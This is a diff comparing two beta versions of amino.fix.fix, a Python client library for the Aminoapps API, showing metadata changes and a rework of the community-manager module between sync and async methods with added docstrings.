# Comparing `tmp/amino.fix.fix-1.0.6b1.tar.gz` & `tmp/amino.fix.fix-1.0.6b2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "amino.fix.fix-1.0.6b1.tar", last modified: Wed Mar 27 13:25:41 2024, max compression
+gzip compressed data, was "amino.fix.fix-1.0.6b2.tar", last modified: Wed Mar 27 15:36:48 2024, max compression
```

## Comparing `amino.fix.fix-1.0.6b1.tar` & `amino.fix.fix-1.0.6b2.tar`

### file list

```diff
@@ -1,35 +1,35 @@
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.127704 amino.fix.fix-1.0.6b1/
--rw-rw-rw-   0        0        0     1095 2024-03-07 00:20:09.000000 amino.fix.fix-1.0.6b1/LICENSE
--rw-rw-rw-   0        0        0     3895 2024-03-27 13:25:41.127704 amino.fix.fix-1.0.6b1/PKG-INFO
--rw-rw-rw-   0        0        0     3412 2024-03-27 12:39:00.000000 amino.fix.fix-1.0.6b1/README.md
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.104067 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/
--rw-rw-rw-   0        0        0     3895 2024-03-27 13:25:41.000000 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      799 2024-03-27 13:25:41.000000 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-03-27 13:25:41.000000 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0      191 2024-03-27 13:25:41.000000 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2024-03-27 13:25:41.000000 amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.110188 amino.fix.fix-1.0.6b1/aminofixfix/
--rw-rw-rw-   0        0        0     1147 2024-03-09 18:08:07.000000 amino.fix.fix-1.0.6b1/aminofixfix/__init__.py
--rw-rw-rw-   0        0        0    16574 2024-03-18 18:32:53.000000 amino.fix.fix-1.0.6b1/aminofixfix/acm.py
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.115187 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/
--rw-rw-rw-   0        0        0     1148 2024-03-09 18:54:15.000000 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/__init__.py
--rw-rw-rw-   0        0        0    16326 2024-03-18 18:59:05.000000 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/acm.py
--rw-rw-rw-   0        0        0    94940 2024-03-27 13:25:05.000000 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/client.py
--rw-rw-rw-   0        0        0    14927 2024-03-19 20:43:01.000000 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/socket.py
--rw-rw-rw-   0        0        0   108674 2024-03-27 13:24:34.000000 amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/sub_client.py
--rw-rw-rw-   0        0        0    93674 2024-03-27 13:21:26.000000 amino.fix.fix-1.0.6b1/aminofixfix/client.py
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.122704 amino.fix.fix-1.0.6b1/aminofixfix/lib/
--rw-rw-rw-   0        0        0       95 2024-03-06 23:42:06.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/__init__.py
--rw-rw-rw-   0        0        0    33502 2024-03-18 19:32:24.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/exceptions.py
-drwxrwxrwx   0        0        0        0 2024-03-27 13:25:41.126703 amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/
--rw-rw-rw-   0        0        0      251 2024-03-27 13:19:12.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/__init__.py
--rw-rw-rw-   0        0        0     3494 2024-03-27 13:09:18.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/aiohttp.py
--rw-rw-rw-   0        0        0     2688 2024-03-27 11:57:04.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/requests.py
--rw-rw-rw-   0        0        0      668 2024-03-27 13:18:55.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/facades/unsuccessful_import.py
--rw-rw-rw-   0        0        0     4016 2024-03-15 22:31:38.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/headers.py
--rw-rw-rw-   0        0        0     4659 2024-03-27 12:11:51.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/helpers.py
--rw-rw-rw-   0        0        0   198008 2024-03-27 13:16:33.000000 amino.fix.fix-1.0.6b1/aminofixfix/lib/objects.py
--rw-rw-rw-   0        0        0    14925 2024-03-19 20:41:56.000000 amino.fix.fix-1.0.6b1/aminofixfix/socket.py
--rw-rw-rw-   0        0        0   105402 2024-03-27 13:24:14.000000 amino.fix.fix-1.0.6b1/aminofixfix/sub_client.py
--rw-rw-rw-   0        0        0       42 2024-03-27 13:25:41.129209 amino.fix.fix-1.0.6b1/setup.cfg
--rw-rw-rw-   0        0        0     1244 2024-03-27 12:35:50.000000 amino.fix.fix-1.0.6b1/setup.py
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.358505 amino.fix.fix-1.0.6b2/
+-rw-rw-rw-   0        0        0     1095 2024-03-07 00:20:09.000000 amino.fix.fix-1.0.6b2/LICENSE
+-rw-rw-rw-   0        0        0     3895 2024-03-27 15:36:48.359499 amino.fix.fix-1.0.6b2/PKG-INFO
+-rw-rw-rw-   0        0        0     3412 2024-03-27 12:39:00.000000 amino.fix.fix-1.0.6b2/README.md
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.329113 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/
+-rw-rw-rw-   0        0        0     3895 2024-03-27 15:36:48.000000 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      799 2024-03-27 15:36:48.000000 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-03-27 15:36:48.000000 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0      191 2024-03-27 15:36:48.000000 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2024-03-27 15:36:48.000000 amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.335195 amino.fix.fix-1.0.6b2/aminofixfix/
+-rw-rw-rw-   0        0        0     1147 2024-03-09 18:08:07.000000 amino.fix.fix-1.0.6b2/aminofixfix/__init__.py
+-rw-rw-rw-   0        0        0    24432 2024-03-27 15:36:06.000000 amino.fix.fix-1.0.6b2/aminofixfix/acm.py
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.343722 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/
+-rw-rw-rw-   0        0        0     1148 2024-03-09 18:54:15.000000 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/__init__.py
+-rw-rw-rw-   0        0        0    16421 2024-03-27 15:23:30.000000 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/acm.py
+-rw-rw-rw-   0        0        0    94792 2024-03-27 14:17:41.000000 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/client.py
+-rw-rw-rw-   0        0        0    14927 2024-03-19 20:43:01.000000 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/socket.py
+-rw-rw-rw-   0        0        0   108618 2024-03-27 14:17:43.000000 amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/sub_client.py
+-rw-rw-rw-   0        0        0   101218 2024-03-27 14:29:31.000000 amino.fix.fix-1.0.6b2/aminofixfix/client.py
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.351223 amino.fix.fix-1.0.6b2/aminofixfix/lib/
+-rw-rw-rw-   0        0        0       95 2024-03-06 23:42:06.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/__init__.py
+-rw-rw-rw-   0        0        0    33502 2024-03-18 19:32:24.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/exceptions.py
+drwxrwxrwx   0        0        0        0 2024-03-27 15:36:48.357504 amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/
+-rw-rw-rw-   0        0        0      251 2024-03-27 13:19:12.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/__init__.py
+-rw-rw-rw-   0        0        0     3494 2024-03-27 13:09:18.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/aiohttp.py
+-rw-rw-rw-   0        0        0     2688 2024-03-27 11:57:04.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/requests.py
+-rw-rw-rw-   0        0        0      668 2024-03-27 13:18:55.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/facades/unsuccessful_import.py
+-rw-rw-rw-   0        0        0     4016 2024-03-15 22:31:38.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/headers.py
+-rw-rw-rw-   0        0        0     4659 2024-03-27 15:36:30.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/helpers.py
+-rw-rw-rw-   0        0        0   198008 2024-03-27 13:16:33.000000 amino.fix.fix-1.0.6b2/aminofixfix/lib/objects.py
+-rw-rw-rw-   0        0        0    14925 2024-03-19 20:41:56.000000 amino.fix.fix-1.0.6b2/aminofixfix/socket.py
+-rw-rw-rw-   0        0        0   144951 2024-03-27 15:36:10.000000 amino.fix.fix-1.0.6b2/aminofixfix/sub_client.py
+-rw-rw-rw-   0        0        0       42 2024-03-27 15:36:48.360501 amino.fix.fix-1.0.6b2/setup.cfg
+-rw-rw-rw-   0        0        0     1244 2024-03-27 15:36:33.000000 amino.fix.fix-1.0.6b2/setup.py
```

### Comparing `amino.fix.fix-1.0.6b1/LICENSE` & `amino.fix.fix-1.0.6b2/LICENSE`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/PKG-INFO` & `amino.fix.fix-1.0.6b2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: amino.fix.fix
-Version: 1.0.6b1
+Version: 1.0.6b2
 Summary: Library for Aminoapps
 Home-page: https://github.com/imperialwool/Amino.fix.fix
 Author: imperialwool
 Author-email: hi@iwool.dev
 License: MIT
 Keywords: aminoapps,amino.fix,amino.fix.fix,amino,amino-bot,narvii,medialab,api,python,python3,python3.x,minori,imperialwool
 Requires-Python: >=3.8
```

### Comparing `amino.fix.fix-1.0.6b1/README.md` & `amino.fix.fix-1.0.6b2/README.md`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/PKG-INFO` & `amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: amino.fix.fix
-Version: 1.0.6b1
+Version: 1.0.6b2
 Summary: Library for Aminoapps
 Home-page: https://github.com/imperialwool/Amino.fix.fix
 Author: imperialwool
 Author-email: hi@iwool.dev
 License: MIT
 Keywords: aminoapps,amino.fix,amino.fix.fix,amino,amino-bot,narvii,medialab,api,python,python3,python3.x,minori,imperialwool
 Requires-Python: >=3.8
```

### Comparing `amino.fix.fix-1.0.6b1/amino.fix.fix.egg-info/SOURCES.txt` & `amino.fix.fix-1.0.6b2/amino.fix.fix.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/__init__.py` & `amino.fix.fix-1.0.6b2/aminofixfix/__init__.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/acm.py` & `amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/acm.py`

 * *Files 8% similar despite different names*

```diff
@@ -2,26 +2,26 @@
 # ^ this thing should fix problem for python3.9 and lower(?)
 
 from typing import BinaryIO
 from json import loads, dumps
 from time import time as timestamp
 
 from . import client
-from .lib import exceptions, headers, objects
+from ..lib import exceptions, headers, objects
 
 class ACM(client.Client):
     def __init__(self, profile: objects.UserProfile, comId: str = None, proxies: dict = None):
         client.Client.__init__(self)
 
         self.profile = profile
         self.comId = comId
         self.proxies = proxies
 
     # TODO : Finish the imaging sizing, might not work for every picture...
-    def create_community(self, name: str, tagline: str, icon: BinaryIO, themeColor: str, joinType: int = 0, primaryLanguage: str = "en"):
+    async def create_community(self, name: str, tagline: str, icon: BinaryIO, themeColor: str, joinType: int = 0, primaryLanguage: str = "en"):
         data = dumps({
             "icon": {
                 "height": 512.0,
                 "imageMatrix": [1.6875, 0.0, 108.0, 0.0, 1.6875, 497.0, 0.0, 0.0, 1.0],
                 "path": self.upload_media(icon),
                 "width": 512.0,
                 "x": 0.0,
@@ -32,69 +32,69 @@
             "primaryLanguage": primaryLanguage,
             "tagline": tagline,
             "templateId": 9,
             "themeColor": themeColor,
             "timestamp": int(timestamp() * 1000)
         })
 
-        response = self.session.post(f"/g/s/community", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/g/s/community", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def delete_community(self, email: str, password: str, verificationCode: str):
+    async def delete_community(self, email: str, password: str, verificationCode: str):
         data = dumps({
             "secret": f"0 {password}",
             "validationContext": {
                 "data": {
                     "code": verificationCode
                 },
                 "type": 1,
                 "identity": email
             },
             "deviceID": self.device_id
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/g/s-x{self.comId}/community/delete-request", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/g/s-x{self.comId}/community/delete-request", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def list_communities(self, start: int = 0, size: int = 25):
-        response = self.session.get(f"/g/s/community/managed?start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+    async def list_communities(self, start: int = 0, size: int = 25):
+        response = await self.session.get(f"/g/s/community/managed?start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.CommunityList(loads(response.text)["communityList"]).CommunityList
 
-    def get_categories(self, start: int = 0, size: int = 25):
+    async def get_categories(self, start: int = 0, size: int = 25):
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.get(f"/x{self.comId}/s/blog-category?start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.get(f"/x{self.comId}/s/blog-category?start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return loads(response.text)
 
-    def change_sidepanel_color(self, color: str):
+    async def change_sidepanel_color(self, color: str):
         data = dumps({
             "path": "appearance.leftSidePanel.style.iconColor",
             "value": color,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return response.status_code
         else: return loads(response.text)
 
-    def get_themepack_info(self, file: BinaryIO):
+    async def get_themepack_info(self, file: BinaryIO):
         """
         This method can be used for getting info about current themepack of community.
         """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.get(f"/g/s-x{self.comId}/community/info?withTopicList=1&withInfluencerList=1&influencerListOrderStrategy=fansCount", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
+        response = await self.session.get(f"/g/s-x{self.comId}/community/info?withTopicList=1&withInfluencerList=1&influencerListOrderStrategy=fansCount", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
-        else: return response.json()['community']['themePack']
-    
-    def upload_themepack_raw(self, file: BinaryIO):
+        else: return await response.json()['community']['themePack']
+
+    async def upload_themepack_raw(self, file: BinaryIO):
         """
         Uploading new themepack.
 
         File is technically a ZIP file, but you should rename .zip to .ndthemepack.
         Also this "zip" file have specific stucture.
 
         The structure is:
@@ -155,124 +155,113 @@
             - "titlebar-image":
                 - w = 320
                 - h = 64
         - you *can* specify "x" and "y" if you want
         - theoretically you can provide different "w" and "h"
         """
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/media/upload/target/community-theme-pack", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/media/upload/target/community-theme-pack", data=file.read(), headers=headers.Headers(data=file.read()).s_headers, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return loads(response.text)
 
-    def promote(self, userId: str, rank: str):
+    async def promote(self, userId: str, rank: str):
         rank = rank.lower().replace("agent", "transfer-agent")
 
         if rank.lower() not in ["transfer-agent", "leader", "curator"]:
             raise exceptions.WrongType(rank)
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/{rank}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/user-profile/{userId}/{rank}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def get_join_requests(self, start: int = 0, size: int = 25):
+    async def get_join_requests(self, start: int = 0, size: int = 25):
         if self.comId is None: raise exceptions.CommunityNeeded()
 
-        response = self.session.get(f"/x{self.comId}/s/community/membership-request?status=pending&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.get(f"/x{self.comId}/s/community/membership-request?status=pending&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.JoinRequest(loads(response.text)).JoinRequest
 
-    def accept_join_request(self, userId: str):
+    async def accept_join_request(self, userId: str):
         data = dumps({})
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/accept", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/accept", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def reject_join_request(self, userId: str):
+    async def reject_join_request(self, userId: str):
         data = dumps({})
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/reject", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/membership-request/{userId}/reject", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def get_community_stats(self):
+    async def get_community_stats(self):
         if self.comId is None: raise exceptions.CommunityNeeded()
 
-        response = self.session.get(f"/x{self.comId}/s/community/stats", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.get(f"/x{self.comId}/s/community/stats", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.CommunityStats(loads(response.text)["communityStats"]).CommunityStats
 
-    def get_community_user_stats(self, type: str, start: int = 0, size: int = 25):
+    async def get_community_user_stats(self, type: str, start: int = 0, size: int = 25):
         if self.comId is None: raise exceptions.CommunityNeeded()
 
         if type.lower() == "leader": target = "leader"
         elif type.lower() == "curator": target = "curator"
         else: raise exceptions.WrongType(type)
 
-        response = self.session.get(f"/x{self.comId}/s/community/stats/moderation?type={target}&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.get(f"/x{self.comId}/s/community/stats/moderation?type={target}&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.UserProfileList(loads(response.text)["userProfileList"]).UserProfileList
 
-    def change_welcome_message(self, message: str, isEnabled: bool = True):
+    async def change_welcome_message(self, message: str, isEnabled: bool = True):
         data = dumps({
             "path": "general.welcomeMessage",
             "value": {
                 "enabled": isEnabled,
                 "text": message
             },
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
-        if response.status_code != 200: return exceptions.CheckException(response)
-        else: return response.status_code
-
-    def change_amino_id(self, aminoId: str):
-        data = dumps({
-            "endpoint": aminoId,
-            "timestamp": int(timestamp() * 1000)
-        })
-
-        if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/settings", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def change_guidelines(self, message: str):
+    async def change_guidelines(self, message: str):
         data = dumps({
             "content": message,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/guideline", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/guideline", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def edit_community(self, name: str = None, description: str = None, aminoId: str = None, primaryLanguage: str = None, themePackUrl: str = None):
+    async def edit_community(self, name: str = None, description: str = None, aminoId: str = None, primaryLanguage: str = None, themePackUrl: str = None):
         data = {"timestamp": int(timestamp() * 1000)}
 
         if name is not None: data["name"] = name
         if description is not None: data["content"] = description
         if aminoId is not None: data["endpoint"] = aminoId
         if primaryLanguage is not None: data["primaryLanguage"] = primaryLanguage
         if themePackUrl is not None: data["themePackUrl"] = themePackUrl
 
         data = dumps(data)
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/settings", data=data, headers=self.parse_headers(data=data), proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/settings", data=data, headers=self.additional_headers(data=data), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def change_module(self, module: str, isEnabled: bool):
+    async def change_module(self, module: str, isEnabled: bool):
         if module.lower() == "chat": mod = "module.chat.enabled"
         elif module.lower() == "livechat": mod = "module.chat.avChat.videoEnabled"
         elif module.lower() == "screeningroom": mod = "module.chat.avChat.screeningRoomEnabled"
         elif module.lower() == "publicchats": mod = "module.chat.publicChat.enabled"
         elif module.lower() == "posts": mod = "module.post.enabled"
         elif module.lower() == "ranking": mod = "module.ranking.enabled"
         elif module.lower() == "leaderboards": mod = "module.ranking.leaderboardEnabled"
@@ -290,39 +279,39 @@
         data = dumps({
             "path": mod,
             "value": isEnabled,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/community/configuration", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def add_influencer(self, userId: str, monthlyFee: int):
+    async def add_influencer(self, userId: str, monthlyFee: int):
         data = dumps({
             "monthlyFee": monthlyFee,
             "timestamp": int(timestamp() * 1000)
         })
 
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.post(f"/x{self.comId}/s/influencer/{userId}", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = await self.session.post(f"/x{self.comId}/s/influencer/{userId}", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def remove_influencer(self, userId: str):
+    async def remove_influencer(self, userId: str):
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.delete(f"/x{self.comId}/s/influencer/{userId}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.delete(f"/x{self.comId}/s/influencer/{userId}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    def get_notice_list(self, start: int = 0, size: int = 25):
+    async def get_notice_list(self, start: int = 0, size: int = 25):
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.get(f"/x{self.comId}/s/notice?type=management&status=1&start={start}&size={size}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.get(f"/x{self.comId}/s/notice?type=management&status=1&start={start}&size={size}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return objects.NoticeList(loads(response.text)["noticeList"]).NoticeList
 
-    def delete_pending_role(self, noticeId: str):
+    async def delete_pending_role(self, noticeId: str):
         if self.comId is None: raise exceptions.CommunityNeeded()
-        response = self.session.delete(f"/x{self.comId}/s/notice/{noticeId}", headers=self.parse_headers(), proxies=self.proxies)
+        response = await self.session.delete(f"/x{self.comId}/s/notice/{noticeId}", headers=self.additional_headers(), proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/__init__.py` & `amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/__init__.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/acm.py` & `amino.fix.fix-1.0.6b2/aminofixfix/acm.py`

 * *Files 24% similar despite different names*

```diff
@@ -1,27 +1,80 @@
 from __future__ import annotations
 # ^ this thing should fix problem for python3.9 and lower(?)
 
 from typing import BinaryIO
 from json import loads, dumps
 from time import time as timestamp
 
-from . import client
-from ..lib import exceptions, headers, objects
+from .client import Client
+from .lib import exceptions, headers, objects
 
-class ACM(client.Client):
-    def __init__(self, profile: objects.UserProfile, comId: str = None, proxies: dict = None):
-        client.Client.__init__(self)
-
-        self.profile = profile
-        self.comId = comId
-        self.proxies = proxies
+class ACM(Client):
+    """
+    ACM is community manager.
+
+    If you have leader or agent rights, you can edit your community.
+    """
+    def __init__(
+            self, mainClient: Client,
+            comId: str = None, aminoId: str = None, **kwargs
+        ):
+        """
+        Init subclient.
+
+        Accepting:
+        - mainClient: aminofixfix.Client
+        - comId: str | int | None
+        - aminoId: str | None
+            - you can pass only one thing
+            - comId will be taken first
+
+    
+        
+        \- imperialwool, where is another fields of subclient??? ;-;
+
+        \- its in main client lol why you need to pass them again
+        """
+        Client.__init__(
+            self, deviceId=mainClient.device_id, proxies=mainClient.proxies,
+            autoDevice=mainClient.autoDevice, userAgent=mainClient.user_agent,
+            http2_enabled=mainClient.http2_enabled,
+            own_timeout=mainClient.timeout_settings,
+            socket_enabled=False,
+            api_library=mainClient.api_library or objects.APILibraries.HTTPX
+        )
+
+        self.profile = mainClient.profile
+        if comId is not None:
+            self.comId = comId
+
+        if aminoId is not None:
+            link = "http://aminoapps.com/c/"
+            self.comId = self.get_from_code(link + aminoId).comId
 
     # TODO : Finish the imaging sizing, might not work for every picture...
-    async def create_community(self, name: str, tagline: str, icon: BinaryIO, themeColor: str, joinType: int = 0, primaryLanguage: str = "en"):
+    def create_community(self, name: str, tagline: str, icon: BinaryIO, themeColor: str, joinType: int = 0, primaryLanguage: str = "en"):
+        """
+        Creating community.
+
+        Accepting:
+        - name: str
+        - tagline: str
+        - icon: BinaryIO
+        - themeColor: str
+        - joinType: int = 0
+            - 0 is open
+            - 1 is semi-closed (you can request to be added in community)
+            - 2 is fully closed (UNAVAILABLE AT ALL FOR ALL APPROVED COMMUNITIES)
+        - primaryLanguage: str = "en"
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "icon": {
                 "height": 512.0,
                 "imageMatrix": [1.6875, 0.0, 108.0, 0.0, 1.6875, 497.0, 0.0, 0.0, 1.0],
                 "path": self.upload_media(icon),
                 "width": 512.0,
                 "x": 0.0,
@@ -32,69 +85,124 @@
             "primaryLanguage": primaryLanguage,
             "tagline": tagline,
             "templateId": 9,
             "themeColor": themeColor,
             "timestamp": int(timestamp() * 1000)
         })
 
-        response = await self.session.post(f"/g/s/community", headers=self.parse_headers(data=data), data=data, proxies=self.proxies)
+        response = self.session.post(f"/g/s/community", headers=self.additional_headers(data=data), data=data, proxies=self.proxies)
         if response.status_code != 200: return exceptions.CheckException(response)
         else: return response.status_code
 
-    async def delete_community(self, email: str, password: str, verificationCode: str):
+    def delete_community(self, email: str, password: str, verificationCode: str):
+        """
+        Deleting community.
+
+        ...Why you need that?
+
+        Accepting:
+        - email: str
+        - password: str
+        - verificationCode: str
+
+        Recieving:
+        - object `int` (200)
+        - on exception, some exception from `aminofixfix.lib.exceptions`
+        """
         data = dumps({
             "secret": f"0 {password}",
             "validationContext": {
                 "data": {
                     "code": verificationCode
                 },
                 "type": 1,
